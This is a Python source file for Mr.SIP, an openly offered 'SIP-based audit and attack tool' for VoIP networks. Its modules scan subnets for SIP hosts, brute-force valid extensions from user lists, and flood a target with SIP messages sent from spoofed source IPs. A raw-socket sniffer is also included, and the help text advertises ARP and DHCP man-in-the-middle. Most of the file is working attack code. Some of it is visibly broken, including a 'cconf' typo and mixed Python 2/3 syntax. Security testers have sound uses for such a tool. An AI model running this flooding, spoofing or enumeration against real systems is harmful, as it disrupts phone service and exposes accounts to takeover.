#!/usr/bin/python
# -*- coding: cp1254 -*-

"""_________________________________________
< Mr.SIP: SIP-Based Audit and Attack Tool! >
 -------------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

#####################################################################################################
        ################################   Authors   ################################ 
#####################################################################################################
"""

__author__ = "Melih Tas"
__copyright__ = "Copyrgiht 2019"
__credits__ = ["Caner", "Onur","Faruk"]
__license__ = "GPL"
__version__ = "1.1.0"
__maintainer__ = "Melih Tas"
__status__ = "V2"     

"""
#####################################################################################################
        ################################   Importing Packages   ################################ 
#####################################################################################################
"""

import random,string,ipaddress,netifaces,os,socket,logging
from optparse import OptionParser, OptionGroup
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import conf, IP
import sip_packet, utilities
import pyfiglet
import itertools
import socket, sys
from struct import *

"""
#####################################################################################################
        ################################   Usage Options   ################################ 
#####################################################################################################
"""
usage = "usage: %prog [--ns|--ds|--se|--sn] [PARAMETERS]"
parser = OptionParser(usage=usage)# SIP-NES: SIP-based Network Scanner 


NES_HELP = 'SIP-NES is a network scanner. It needs the IP range or IP subnet information as input. It sends SIP OPTIONS message to each IP addresses in the subnet/range and according to the responses, it provides the output of the potential SIP clients and servers on that subnet.'
ENUM_HELP = 'SIP-ENUM is an enumerator. It needs the output of SIP-NES and also pre-defined SIP usernames. It generates SIP REGISTER messages and sends them to all SIP components and tries to find the valid SIP users on the target network. You can write the output in a file.'
DAS_HELP = 'SIP-DAS is a DoS/DDoS attack simulator. It comprises four components: powerful spoofed IP address generator, SIP message generator, message sender and response parser. It needs the outputs of SIP-NES and SIP-ENUM along with some pre-defined files.'
SNIFF_HELP = 'SIP-SNIFF is responsible for MITM attack and capturing VoIP packets. It use ARP,DHCP,ICMP procosol to forward SIP traffic over UDV/TCP.'

parser.add_option("--ns", "--network-scanner", action="store_true", dest="network_scanner", default=False, help=NES_HELP) # SIP-ENUM: SIP-based Enumerator 
parser.add_option("--se", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help=ENUM_HELP)# SIP-DAS: SIP-based DoS Attack Simulator 
parser.add_option("--ds", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help=DAS_HELP)
parser.add_option("--sn", "--sniff", action="store_true", dest="sip_sniffer", default=False, help=SNIFF_HELP) #SIP-SNIFF: MITM attack simulator.


NES_USAGE = """python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_IP> --dp=<server_port>  
python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_network_range> --dp=<server_port>
python2 mr.sip.py --if=<interface> --tc=<thread_count> --ns --tn <target_network_address> --dp=<server_port>
"""
ENUM_USAGE = """
python2 mr.sip.py --if=<interface> --tc=<thread_count> --se --dp=5060 --fu=fromUser.txt
python2 mr.sip.py --if=<interface> --tc=<thread_count> --se --dp=5060 --tn <target_IP> --fu=fromUser.txt
"""
DAS_USAGE = """python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -r --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -s --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt 
python2 mr.sip.py --if=<interface> --ds -dm=invite -c <package_count> --tn=<target_IP> --dp=<server_port> -m --to=toUser.txt --fu=fromUser.txt --ua=userAgent.txt --su=spUser.txt --il=ip_list.txt 
"""

SNIFF_USAGE = """
python2 mr.sip.py --if=<interface> --mm=ARP --tn=<target_IP> -g=<gateway_IP> --dp=5060 -o=output.pcap
python2 mr.sip.py --if=<interface> --mm=DHCP --br=<broadcast_IP> --ie=<DHCP_IP_END> --is=<DHCP_IP_START> --dn=<DNS_IP> --nm=<NETMASK_IP> fd=<fake_DHCP_server_IP> -g=<gateway_IP> --dp=5060 -o=output.pcap
"""

group_NES_usage = OptionGroup(parser, "SIP-NES Usage", NES_USAGE) # "IP range format: 192.168.1.10-192.168.1.20. Output also written to ip_list.txt."
group_ENUM_usage = OptionGroup(parser, "SIP-ENUM Usage", ENUM_USAGE) # "It reads from ip_list.txt. You can also give the target by using --di=<target_server_IP>."        
group_DAS_usage = OptionGroup(parser, "SIP-DAS Usage", DAS_USAGE) # "-r means random, -s is subnet -m is manual. Default uses scapy library, for socket library, use with -l, however socket library doesn't support IP spoofing."
group_SNIFF_usage = OptionGroup(parser, "SIP-SNIFF Usage", SNIFF_USAGE) # "it creates a new interface for IP requests to DHCP and fake DHCP server. " 

parser.add_option_group(group_NES_usage)
parser.add_option_group(group_ENUM_usage)
parser.add_option_group(group_DAS_usage)
parser.add_option_group(group_SNIFF_usage)


group = OptionGroup(parser, "Parameters")
group.add_option("--tn", "--target-network", dest="target_network", help="Target network range to scan.")
group.add_option("--dm", "--dos-method", dest="dos_method", help="Message type selection. OPTIONS, INVITE, REGISTER, SUBSCRIBE, CANCEL, BYE or other custom method.")
group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
group.add_option("--to", "--to-user", dest="to_user", default="toUser.txt", help="To User list file. Default is toUser.txt.")
group.add_option("--fu", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file. Default is fromUser.txt.")
group.add_option("--su", "--sp-user", dest="sp_user", default="spUser.txt", help="SP User list file. Default is spUser.txt.")
group.add_option("--ua", "--user-agent", dest="user_agent", default="userAgent.txt", help="User Agent list file. Default is userAgent.txt.")
group.add_option("--il", "--manual-ip-list", dest="manual_ip_list", help="IP list file.")
group.add_option("--if", "--interface", dest="interface", help="Interface to work on.")
group.add_option("--tc", "--thread-count", dest="thread_count", default="10", help="Number of threads running.")
group.add_option("-i", "--ip-save-list", dest="ip_list", default="ip_list.txt", help="Output file to save live IP address.\n Default is inside application folder ip_list.txt.")
group.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
group.add_option("-l", "--lib", action="store_true", dest="library", default=False, help="Use Socket library (no spoofing), default is Scapy")
group.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
group.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually. If you choose manually, you have to specify an IP list via --il parameter.")
group.add_option("-s", "--subnet", action="store_true", dest="subnet", default=False, help="Spoof IP addresses from the same subnet.")
group.add_option("--mm", "--mitm-method", default=False, help="MITM method type selection. ARP,DHCP,ICMP")
group.add_option("-g", "--gateway", default=False, help="it required to poison ARP table of router")
group.add_option("-o", "--output", default=False, help="pcap file to store captured traffic.")
group.add_option("--br", "--broadcast", help="Broadcast IP address for Fake DHCP server")
group.add_option("--ie", "--ipend", help="The last IP to give out")
group.add_option("--is", "--ipstart", help="The first IP to give out")
group.add_option("--dn", "--dnsip", help="The DNS server IP address")
group.add_option("--nm", "--netmask", help="The netmask of local subnet")
group.add_option("--fd", "--dhcpip", help="The IP of the fake DHCP server")

parser.add_option_group(group)
    
(options, args) = parser.parse_args()

"""
#####################################################################################################
        ################################   Real Code   ################################ 
#####################################################################################################
"""



import threading
import queue
import time



###########   setting up objects and vars for threading   ##################
threadList = ["thread-" + str(_) for _ in range(int(options.thread_count))]
queueLock = threading.Lock()  # work will be done sorted by hosts
workQueue = queue.Queue()  # create a queue with maximum capacity
threads = []  # threads will be placed here, to close them later
counter = 0
timeToExit = 0



def main():
    
   # ascii_banner = pyfiglet.figlet_format("Mr.SIP: SIP-Based Audit and Attack Tool")
   # print(ascii_banner + "\033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m") 

   banner = """
 __  __      ____ ___ ____      ____ ___ ____       _                        _ 
|  \/  |_ __/ ___|_ _|  _ \ _  / ___|_ _|  _ \     | |__   __ _ ___  ___  __| |
| |\/| | '__\___ \| || |_) (_) \___ \| || |_) |____| '_ \ / _` / __|/ _ \/ _` |
| |  | | | _ ___) | ||  __/ _   ___) | ||  __/_____| |_) | (_| \__ \  __/ (_| |
|_|  |_|_|(_)____/___|_|   (_) |____/___|_|        |_.__/ \__,_|___/\___|\__,_|
                                                                               
    _             _ _ _                     _      _   _   _             _    
   / \  _   _  __| (_) |_    __ _ _ __   __| |    / \ | |_| |_ __ _  ___| | __
  / _ \| | | |/ _` | | __|  / _` | '_ \ / _` |   / _ \| __| __/ _` |/ __| |/ /
 / ___ \ |_| | (_| | | |_  | (_| | | | | (_| |  / ___ \ |_| || (_| | (__|   < 
/_/   \_\__,_|\__,_|_|\__|  \__,_|_| |_|\__,_| /_/   \_\__|\__\__,_|\___|_|\_\\
                                                                              
 _____           _ 
|_   _|__   ___ | |
  | |/ _ \ / _ \| |
  | | (_) | (_) | |
  |_|\___/ \___/|_|+ \033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m
   """ + "Greetz ~ \033[1m\033[94m 	Caner \033[1m\033[93m Onur \033[1m\033[95m Nesli \033[1m\033[96m Faruk \n"
                   
   print (banner)
   if options.interface is not None:
      conf.iface = options.interface

   s = time.time()

   if options.network_scanner:
      networkScanner()
   elif options.dos_simulator:
      dosSmilator()
   elif options.sip_enumerator:
      sipEnumerator()
   elif options.sip_sniffer:
      sipSniff()

   e = time.time()
   print ("time taken: {}".format(e-s))


# SIP-NES: SIP-based Network Scanner
def networkScanner():
   conf.verb = 0
   
   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']

   printInital("Network scan :", conf.iface, client_ip)

   dos_method = options.dos_method if options.dos_method else "options"

   if '-' in options.target_network or '/' in options.target_network:  # Create new threads
      global counter
      global timeToExit
      counter = 0

      threadID = 0
      for threadName in threadList:
         thread = ThreadSIPNES(threadID, threadName, dos_method, options.dest_port, client_ip)
         thread.start()  # invoke the 'run()' function in the class
         threads.append(thread)
         threadID += 1

   if "-" in options.target_network:
      host_range = options.target_network.split("-")

      host = ipaddress.IPv4Address(unicode(host_range[0]))
      last = ipaddress.IPv4Address(unicode(host_range[1]))

      if ipaddress.IPv4Address(host) > ipaddress.IPv4Address(last):
         print ("\033[1;31;40m Error: Second value must bigger than First value.\033[0m")
         exit(0)

      # Fill the queue with hosts
      for host in range(ipaddress.IPv4Address(host), ipaddress.IPv4Address(last) + 1): workQueue.put(ipaddress.IPv4Address(host))  # work to do!

      # finish up the work
      while not workQueue.empty(): pass  # Wait for queue
      timeToExit = 1  # Notify threads
      for t in threads: t.join()  # Wait for all threads to complete
   elif "/" in options.target_network:
      targetNetwork = ipaddress.IPv4Network(unicode(options.target_network), strict=False)
               
      # Fill the queue with for runners
      for host in targetNetwork.hosts(): workQueue.put(host)  # work to do!

      # finish up the work
      while not workQueue.empty(): pass  # Wait for queue to empty
      timeToExit = 1  # Notify threads it's time to exit
      for t in threads: t.join()  # Wait for all threads to complete
   else:
      host =  options.target_network
      sip = sip_packet.sip_packet(dos_method, host, options.dest_port, client_ip, protocol="socket", wait=True)
      result = sip.generate_packet()

      if result["status"] and result["response"]['code'] == 200:
         printResult(result,host)
         counter += 1
   print ("\033[31m[!] Network scan process finished and {0} live IP address(s) found.\033[0m".format(str(counter)))


# SIP-ENUM: SIP-based Enumerator 
def sipEnumerator():
   conf.verb = 0
   
   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']

   printInital("Enumeration", conf.iface, client_ip)

   dos_method = options.dos_method if options.dos_method else "subscribe"

   user_list = utilities.readFile(options.from_user).split("\n")
   if len(user_list) <= 1:
      print ("\033[1;31;40m Error: From user not found. Please enter a valid From User list.\033[0m")
      exit(0)


   # TODO: input validation for --tn ...
   if options.target_network:
      target_networks = [options.target_network]
   else:
      content = utilities.readFile("ip_list.txt").split(";")
      if len(content[0]) <= 1:
         print ("\033[1;31;40m Error: Target IP not found. Please run SIP-NES first for detect the target IPs.\033[0m")
         exit(0)

      with open('ip_list.txt', 'r') as f: target_networks = [line.split(';')[0] for line in f.readlines()] 

   # combination of all target_networks with user_IDs
   target_network__user_id = [(target_network, user_id) for target_network, user_id in itertools.product(target_networks, user_list)]


   global counter
   global timeToExit
   global workQueue
   # global prog_bar_counter
   # global len_total 

   counter = 0  # extension counter
   # prog_bar_counter = 0
   # len_total = len(target_network__user_id)

   print("running with {} threads".format(len(threadList)))
   threadID = 0
   for threadName in threadList:
      thread = ThreadSIPENUM(threadID, threadName, dos_method, options.dest_port, client_ip)
      thread.start()  # invoke the 'run()' function in the class
      threads.append(thread)
      threadID += 1

   _prompt_new = "{} user IDs will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n) \n"
   isContinue = raw_input(_prompt_new.format(len(user_list), len(target_networks), len(target_network__user_id)))
   
   if isContinue == 'y':
      for tn_ui in target_network__user_id: workQueue.put(tn_ui)
      while not workQueue.empty(): pass # Wait for queue to empty
   elif isContinue == 'n':
         timeToExit = 1
         print("Terminating by user input")
         for t in threads: t.join()  # Wait for all threads to complete
         exit(0)
   else:
      timeToExit = 1 
      for t in threads: t.join()  
      print("Answer not understood. Please answer y/n.")
      exit(0)

   timeToExit = 1  
   for t in threads: t.join()  

   print ("[!] " + str(counter) + " SIP Extension Found.")
             
             
# SIP-DAS: SIP-based DoS Attack Simulator
def dosSmilator():
   cconf.verb = 0
   
   client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
   client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']

   printInital("DoS attack simulation", conf.iface, client_ip)

   dos_method = options.dos_method if options.dos_method else "invite"

   utilities.promisc("on",conf.iface)

   i = 0
   while i < int(options.counter):
      try:
         toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
         fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
         spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
         userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
         
         pkt= IP(dst=options.target_network)
         client = pkt.src
         
         if options.random and not options.library:
               client = utilities.randomIPAddress()
         if options.manual and not options.library:
               client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
         if options.subnet and not options.library:
               client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask, False)
         send_protocol = "scapy"
         if options.library:
               send_protocol = "socket"
               
         sip = sip_packet.sip_packet(str(dos_method), str(options.target_network), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
         sip.generate_packet()
         i += 1
         utilities.printProgressBar(i,int(options.counter),"Progress: ")
      except (KeyboardInterrupt):
         utilities.promisc("off",conf.iface)
         print ("Exiting traffic generation...")
         raise SystemExit
   
   print ("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i),str(options.target_network)))
   utilities.promisc("off",conf.iface)


# SIP-SNIFF: MITM attack simulator and sniffer
def sipSniff():
	#create a AF_PACKET type raw socket (thats basically packet level)
	#define ETH_P_ALL    0x0003          /* Every packet (be careful!!!) */
	try:
		s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
	except socket.error , msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	# receive a packet
	while True:
		packet = s.recvfrom(65565)
		
		#packet string from tuple
		packet = packet[0]
		
		#parse ethernet header
		eth_length = 14
		
		eth_header = packet[:eth_length]
		eth = unpack('!6s6sH' , eth_header)
		eth_protocol = socket.ntohs(eth[2])
		print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(packet[6:12]) + ' Protocol : ' + str(eth_protocol)

		#Parse IP packets, IP Protocol number = 8
		if eth_protocol == 8 :
			#Parse IP header
			#take first 20 characters for the ip header
			ip_header = packet[eth_length:20+eth_length]
			
			#now unpack them :)
			iph = unpack('!BBHHHBBH4s4s' , ip_header)

			version_ihl = iph[0]
			version = version_ihl >> 4
			ihl = version_ihl & 0xF

			iph_length = ihl * 4

			ttl = iph[5]
			protocol = iph[6]
			s_addr = socket.inet_ntoa(iph[8]);
			d_addr = socket.inet_ntoa(iph[9]);

			print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(s_addr) + ' Destination Address : ' + str(d_addr)

			#TCP protocol
			if protocol == 6 :
				t = iph_length + eth_length
				tcp_header = packet[t:t+20]

				#now unpack them :)
				tcph = unpack('!HHLLBBHHH' , tcp_header)
				
				source_port = tcph[0]
				dest_port = tcph[1]
				sequence = tcph[2]
				acknowledgement = tcph[3]
				doff_reserved = tcph[4]
				tcph_length = doff_reserved >> 4
				
				print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)
				
				h_size = eth_length + iph_length + tcph_length * 4
				data_size = len(packet) - h_size
				
				#get data from the packet
				data = packet[h_size:]
				
				print 'Data : ' + data

			#ICMP Packets
			elif protocol == 1 :
				u = iph_length + eth_length
				icmph_length = 4
				icmp_header = packet[u:u+4]

				#now unpack them :)
				icmph = unpack('!BBH' , icmp_header)
				
				icmp_type = icmph[0]
				code = icmph[1]
				checksum = icmph[2]
				
				print 'Type : ' + str(icmp_type) + ' Code : ' + str(code) + ' Checksum : ' + str(checksum)
				
				h_size = eth_length + iph_length + icmph_length
				data_size = len(packet) - h_size
				
				#get data from the packet
				data = packet[h_size:]
				
				print 'Data : ' + data

			#UDP packets
			elif protocol == 17 :
				u = iph_length + eth_length
				udph_length = 8
				udp_header = packet[u:u+8]

				#now unpack them :)
				udph = unpack('!HHHH' , udp_header)
				
				source_port = udph[0]
				dest_port = udph[1]
				length = udph[2]
				checksum = udph[3]
				
				print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum)
				
				h_size = eth_length + iph_length + udph_length
				data_size = len(packet) - h_size
				
				#get data from the packet
				data = packet[h_size:]
				
				print 'Data : ' + data

			#some other IP packet like IGMP
			else :
				print 'Protocol other than TCP/UDP/ICMP'
				
			print





# Print functions:
def printInital(moduleName, client_iface, client_ip):
   print ("\033[33m[!] Client Interface: {}\033[0m".format(str(client_iface)))
   print ("\033[33m[!] Client IP: {}\033[0m".format(str(client_ip)))
   print ("\033[94m[!] {} process started. \033[0m".format(moduleName))


def printResult(result,target):
   user_agent = ""
   for key, value in result["response"]['headers'].iteritems():
      if key == "user-agent":              
         user_agent = list(value)[0]

   if utilities.defineTargetType(user_agent) == "Server":
      print ("\033[1;32m[+] New live IP found on {}, It seems as a SIP Server ({}).\033[0m".format(target, user_agent))
      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
      removeDuplicateLines(options.ip_list)
   else:
      print ("\033[1;32m[+] New live IP found on " + target + ", It seems as a SIP Client.\033[0m")
      utilities.writeFile(options.ip_list, target + ";" + user_agent + ";SIP Server" + "\n")
      removeDuplicateLines(options.ip_list)


def removeDuplicateLines(path):
   with open(path, 'r+') as f:
      unique = list(dict.fromkeys([line for line in f.readlines()]))
      f.seek(0)
      for line in unique: f.write(line)
      f.truncate()



# Thread object for SIP-NES function
class ThreadSIPNES(threading.Thread):
   def __init__(self, threadID, name, option, dest_port, client_ip):
      threading.Thread.__init__(self)  # inherit the constructor
      self.threadID = threadID
      self.name = name

      self.option = option
      self.dest_port = dest_port
      self.client_ip = client_ip
   
   def run(self):
      global counter  # notice how we use 'global' counter
      global timeToExit
      global workQueue
      global queueLock

      while not timeToExit:
         queueLock.acquire()
         if not workQueue.empty():
            host = workQueue.get()  # get host
            queueLock.release()  # when host is acquired, release the lock

            # print(str(host))

            sip = sip_packet.sip_packet(self.option, host, self.dest_port, self.client_ip, protocol="socket", wait=True)  # set options
            result = sip.generate_packet()  # generate packet.

            if result["status"]: 
               if result["response"]['code'] == 200:
                  printResult(result,str(host))
                  counter += 1  # global counter changed
         else:
            queueLock.release()  # when no jobs exist, release the lock


# Thread object for SIP-ENUM
class ThreadSIPENUM(threading.Thread):
   def __init__(self, threadID, name, option, dest_port, client_ip):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.name = name

      self.option = option
      self.dest_port = dest_port
      self.client_ip = client_ip

   def run(self):
      global counter  # extension counter
      global timeToExit
      global workQueue
      global queueLock
      # global prog_bar_counter
      # global len_total

      while not timeToExit:
         queueLock.acquire()
         if not workQueue.empty():
            tn_ui = workQueue.get()  # get host
            queueLock.release()  # when host is acquired, release the lock

            target_network = tn_ui[0]
            user_id = tn_ui[1]

            # print("tn: {} - ui: {} - method: {}".format(target_network, user_id, self.option))

            sip = sip_packet.sip_packet(self.option, target_network, self.dest_port, self.client_ip, from_user = user_id.strip(),to_user = user_id.strip(),protocol="socket", wait=True)
            result = sip.generate_packet()

            # printProgressBar(prog_bar_counter, len_total, 'progress', 'completed')
            # prog_bar_counter += 1

            if result["status"]:
               if not len(result["response"]):
                  print ("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id))
                  counter += 1
               elif result["response"]['code'] == 200:
                  print ("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id))
                  counter += 1
               elif result["response"]['code'] == 401:
                  print ("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id))
                  counter += 1
               elif result["response"]['code'] == 403:
                  print ("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id))
                  counter += 1
         else:
            queueLock.release()



if __name__ == "__main__":
   main()
    
